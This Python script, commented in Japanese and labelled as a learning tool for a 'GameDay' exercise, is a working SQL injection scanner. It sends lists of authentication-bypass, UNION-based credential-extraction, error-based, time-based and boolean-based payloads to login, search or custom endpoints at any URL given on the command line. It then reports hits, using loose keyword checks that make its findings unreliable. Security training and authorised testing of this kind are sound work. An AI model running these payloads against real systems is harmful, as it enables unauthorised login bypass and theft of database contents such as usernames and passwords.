#!/usr/bin/env python3
"""
SQLインジェクション脆弱性テストスクリプト
GameDay環境での学習目的のみに使用
"""

import requests
import argparse
import json
import logging
import time
from datetime import datetime
from typing import List, Dict, Any, Optional
import urllib.parse
import sys
import os

# ログ設定
def setup_logging(log_level: str = "INFO") -> logging.Logger:
    """ログ設定を初期化"""
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = f"{log_dir}/sql_injection_{timestamp}.log"
    
    logging.basicConfig(
        level=getattr(logging, log_level.upper()),
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(sys.stdout)
        ]
    )
    
    logger = logging.getLogger(__name__)
    logger.info(f"ログファイル: {log_file}")
    return logger

class SQLInjectionTester:
    """SQLインジェクション脆弱性テスター"""
    
    def __init__(self, base_url: str, logger: logging.Logger):
        self.base_url = base_url.rstrip('/')
        self.logger = logger
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GameDay-SQLi-Tester/1.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'ja,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # SQLインジェクションペイロード
        self.payloads = {
            'basic_auth_bypass': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 'x'='x",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "') OR (1=1)--",
                "' OR 1=1 LIMIT 1--"
            ],
            'union_based': [
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT null,null,null--",
                "' UNION SELECT 1,username,password FROM users--",
                "' UNION SELECT 1,user(),version()--",
                "' UNION SELECT 1,database(),user()--",
                "' UNION SELECT 1,@@version,@@datadir--",
                "' UNION ALL SELECT 1,2,3--",
                "' UNION SELECT 1,table_name,column_name FROM information_schema.columns--"
            ],
            'error_based': [
                "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND (SELECT SLEEP(5))--",
                "' OR SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
                "' AND IF(1=1,SLEEP(5),0)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a'--",
                "' AND 'a'='b'--",
                "' AND (SELECT SUBSTRING(version(),1,1))='5'--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND LENGTH(database())>1--"
            ]
        }
        
        # 脆弱性検出パターン
        self.vulnerability_indicators = {
            'sql_error_patterns': [
                'mysql_fetch_array',
                'mysql_num_rows',
                'mysql_error',
                'Warning: mysql_',
                'MySQLSyntaxErrorException',
                'SQLException',
                'sqlite3.OperationalError',
                'sqlite_master',
                'ORA-00933',
                'Microsoft OLE DB Provider',
                'Unclosed quotation mark',
                'quoted string not properly terminated'
            ],
            'success_patterns': [
                'welcome',
                'dashboard',
                'profile',
                'admin panel',
                'logged in',
                'authentication successful'
            ]
        }
    
    def test_login_endpoint(self, endpoint: str = "/login") -> List[Dict[str, Any]]:
        """ログインエンドポイントのSQLインジェクションテスト"""
        self.logger.info(f"ログインエンドポイントのテスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        for category, payloads in self.payloads.items():
            self.logger.info(f"カテゴリ '{category}' のテスト実行中...")
            
            for payload in payloads:
                result = self._test_single_payload(
                    url, 
                    {'username': payload, 'password': 'test'}, 
                    method='POST',
                    payload_type=category,
                    payload=payload
                )
                results.append(result)
                
                # レート制限を避けるため少し待機
                time.sleep(0.5)
        
        return results
    
    def test_search_endpoint(self, endpoint: str = "/search") -> List[Dict[str, Any]]:
        """検索エンドポイントのSQLインジェクションテスト"""
        self.logger.info(f"検索エンドポイントのテスト開始: {endpoint}")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        for category, payloads in self.payloads.items():
            self.logger.info(f"カテゴリ '{category}' のテスト実行中...")
            
            for payload in payloads:
                # GETパラメータとしてテスト
                result = self._test_single_payload(
                    url,
                    {'q': payload, 'search': payload},
                    method='GET',
                    payload_type=category,
                    payload=payload
                )
                results.append(result)
                
                time.sleep(0.5)
        
        return results
    
    def test_custom_endpoint(self, endpoint: str, parameters: Dict[str, str], method: str = 'GET') -> List[Dict[str, Any]]:
        """カスタムエンドポイントのSQLインジェクションテスト"""
        self.logger.info(f"カスタムエンドポイント '{endpoint}' のテスト開始")
        results = []
        
        url = f"{self.base_url}{endpoint}"
        
        for param_name in parameters.keys():
            self.logger.info(f"パラメータ '{param_name}' のテスト中...")
            
            for category, payloads in self.payloads.items():
                for payload in payloads:
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    result = self._test_single_payload(
                        url,
                        test_params,
                        method=method,
                        payload_type=category,
                        payload=payload,
                        parameter=param_name
                    )
                    results.append(result)
                    
                    time.sleep(0.5)
        
        return results
    
    def _test_single_payload(self, url: str, data: Dict[str, str], method: str = 'GET', 
                           payload_type: str = '', payload: str = '', parameter: str = '') -> Dict[str, Any]:
        """単一ペイロードのテスト実行"""
        start_time = time.time()
        
        try:
            if method.upper() == 'GET':
                response = self.session.get(url, params=data, timeout=10)
            else:
                response = self.session.post(url, data=data, timeout=10)
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # 脆弱性の検出
            vulnerability_detected = self._analyze_response(response, response_time)
            
            result = {
                'url': url,
                'method': method,
                'payload_type': payload_type,
                'payload': payload,
                'parameter': parameter,
                'status_code': response.status_code,
                'response_time': response_time,
                'response_length': len(response.text),
                'vulnerability_detected': vulnerability_detected['detected'],
                'vulnerability_type': vulnerability_detected['type'],
                'evidence': vulnerability_detected['evidence'],
                'timestamp': datetime.now().isoformat()
            }
            
            if vulnerability_detected['detected']:
                self.logger.warning(f"脆弱性検出: {payload_type} - {payload}")
                self.logger.warning(f"証拠: {vulnerability_detected['evidence']}")
            
            return result
            
        except Exception as e:
            end_time = time.time()
            response_time = end_time - start_time
            
            self.logger.error(f"リクエスト失敗: {str(e)}")
            
            return {
                'url': url,
                'method': method,
                'payload_type': payload_type,
                'payload': payload,
                'parameter': parameter,
                'status_code': 0,
                'response_time': response_time,
                'response_length': 0,
                'vulnerability_detected': False,
                'vulnerability_type': 'error',
                'evidence': str(e),
                'timestamp': datetime.now().isoformat()
            }
    
    def _analyze_response(self, response: requests.Response, response_time: float) -> Dict[str, Any]:
        """レスポンスの脆弱性分析"""
        response_text = response.text.lower()
        
        # SQLエラーパターンの検出
        for pattern in self.vulnerability_indicators['sql_error_patterns']:
            if pattern.lower() in response_text:
                return {
                    'detected': True,
                    'type': 'sql_error',
                    'evidence': f"SQLエラーパターン検出: {pattern}"
                }
        
        # 認証バイパス成功パターンの検出
        for pattern in self.vulnerability_indicators['success_patterns']:
            if pattern.lower() in response_text:
                return {
                    'detected': True,
                    'type': 'auth_bypass',
                    'evidence': f"認証バイパス成功パターン検出: {pattern}"
                }
        
        # 時間ベース攻撃の検出（5秒以上の応答時間）
        if response_time > 4.5:  # 少しマージンを持たせる
            return {
                'detected': True,
                'type': 'time_based',
                'evidence': f"異常な応答時間: {response_time:.2f}秒"
            }
        
        # レスポンスサイズの異常検出
        if len(response.text) > 50000:  # 50KB以上
            return {
                'detected': True,
                'type': 'data_extraction',
                'evidence': f"異常に大きなレスポンス: {len(response.text)}バイト"
            }
        
        # ステータスコードの異常
        if response.status_code == 500:
            return {
                'detected': True,
                'type': 'server_error',
                'evidence': f"サーバーエラー: {response.status_code}"
            }
        
        return {
            'detected': False,
            'type': 'none',
            'evidence': ''
        }
    
    def generate_report(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """テスト結果のレポート生成"""
        total_tests = len(results)
        vulnerabilities_found = [r for r in results if r['vulnerability_detected']]
        
        vulnerability_types = {}
        for vuln in vulnerabilities_found:
            vuln_type = vuln['vulnerability_type']
            vulnerability_types[vuln_type] = vulnerability_types.get(vuln_type, 0) + 1
        
        payload_success_rate = {}
        for result in results:
            payload_type = result['payload_type']
            if payload_type not in payload_success_rate:
                payload_success_rate[payload_type] = {'total': 0, 'successful': 0}
            
            payload_success_rate[payload_type]['total'] += 1
            if result['vulnerability_detected']:
                payload_success_rate[payload_type]['successful'] += 1
        
        # 成功率の計算
        for payload_type in payload_success_rate:
            total = payload_success_rate[payload_type]['total']
            successful = payload_success_rate[payload_type]['successful']
            payload_success_rate[payload_type]['success_rate'] = (successful / total * 100) if total > 0 else 0
        
        report = {
            'target_url': self.base_url,
            'test_summary': {
                'total_tests': total_tests,
                'vulnerabilities_found': len(vulnerabilities_found),
                'vulnerability_rate': (len(vulnerabilities_found) / total_tests * 100) if total_tests > 0 else 0
            },
            'vulnerability_types': vulnerability_types,
            'payload_effectiveness': payload_success_rate,
            'high_risk_findings': [
                vuln for vuln in vulnerabilities_found 
                if vuln['vulnerability_type'] in ['auth_bypass', 'data_extraction', 'sql_error']
            ],
            'test_timestamp': datetime.now().isoformat(),
            'detailed_results': results
        }
        
        return report

def main():
    """メイン関数"""
    parser = argparse.ArgumentParser(description='SQLインジェクション脆弱性テスト')
    parser.add_argument('-u', '--url', required=True, help='ターゲットベースURL')
    parser.add_argument('-e', '--endpoint', help='テスト対象エンドポイント')
    parser.add_argument('-t', '--test-type', choices=['login', 'search', 'custom'], 
                       default='login', help='テストタイプ')
    parser.add_argument('-p', '--parameters', help='カスタムパラメータ（JSON形式）')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', 
                       help='HTTPメソッド（カスタムテスト用）')
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'], 
                       default='INFO', help='ログレベル')
    parser.add_argument('--output', help='結果出力ファイル（JSON形式）')
    
    args = parser.parse_args()
    
    # ログ設定
    logger = setup_logging(args.log_level)
    
    # テスター初期化
    tester = SQLInjectionTester(args.url, logger)
    
    # テスト実行
    try:
        if args.test_type == 'login':
            endpoint = args.endpoint or '/login'
            results = tester.test_login_endpoint(endpoint)
        elif args.test_type == 'search':
            endpoint = args.endpoint or '/search'
            results = tester.test_search_endpoint(endpoint)
        elif args.test_type == 'custom':
            if not args.endpoint:
                logger.error("カスタムテストにはエンドポイントの指定が必要です")
                return 1
            
            parameters = {}
            if args.parameters:
                try:
                    parameters = json.loads(args.parameters)
                except json.JSONDecodeError:
                    logger.error("パラメータのJSON形式が無効です")
                    return 1
            
            results = tester.test_custom_endpoint(args.endpoint, parameters, args.method)
        
        # レポート生成
        report = tester.generate_report(results)
        
        # 結果表示
        logger.info("=== SQLインジェクションテスト結果 ===")
        logger.info(f"総テスト数: {report['test_summary']['total_tests']}")
        logger.info(f"脆弱性検出数: {report['test_summary']['vulnerabilities_found']}")
        logger.info(f"脆弱性検出率: {report['test_summary']['vulnerability_rate']:.2f}%")
        
        if report['vulnerability_types']:
            logger.info("検出された脆弱性タイプ:")
            for vuln_type, count in report['vulnerability_types'].items():
                logger.info(f"  {vuln_type}: {count}件")
        
        if report['high_risk_findings']:
            logger.warning(f"高リスクな脆弱性: {len(report['high_risk_findings'])}件")
        
        # 結果をファイルに保存
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            logger.info(f"結果をファイルに保存: {args.output}")
    
    except Exception as e:
        logger.error(f"テスト実行中にエラーが発生: {e}")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main())